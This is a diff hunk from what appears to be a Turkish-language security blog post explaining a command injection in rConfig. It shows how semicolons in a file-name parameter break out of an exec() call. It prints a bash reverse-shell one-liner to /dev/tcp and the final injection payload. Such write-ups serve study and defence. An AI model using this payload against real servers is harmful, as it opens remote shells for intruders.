@@ -99,7 +99,7 @@ Ve <strong>$fileName</strong> değişkeni yine aynı dosyanın 14-22. satırlar�
 <strong>exec()</strong> fonksiyonu içerisine <strong>$fullpath</strong> değişkeni gidiyor. Bu değişkenin ön tanımlı bir değeri örnek olarak "/home/rconfig" daha sonra dizin değerine bizden alınan $fileName değişkeni ekleniyor.
 Bu durumda ilk olarak değişkenimize <code>;</code> karakteri verirsek <strong>$fullpath</strong> değişkeninden gelen değerden kurtulmuş oluyoruz. Ek olarak, <strong>$fileName</strong> değişkenine <strong>.yml</strong> uzantısı veren
 bir kontrolde bulunuyordu. Aynı şekilde payloadın sonunada <code>;</code> karakteri koyarak bu uzantı ekleme işleminide atlatabiliriz.
-Yani payload taslağımız: <strong> ; REVERSESHELL CODE;</strong> şeklinde olacak.
+<br>Oluşan payload taslağımız: <strong> ; REVERSESHELL CODE;</strong><br>
 Uygulama varsayılan olarak centOS üzerinde çalışıyor bu sebeple PANDORAFMS de olduğu gibi reverse shell için netcat kullanamayız fakat <strong>bash</strong> kullanabiliriz.
 <p>Bash reverse shell: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1</p>
 <p>Bununla beraber sonuç payladımız: <strong> ;bash -i >& /dev/tcp/IP/8080 0>&1;</strong></p>
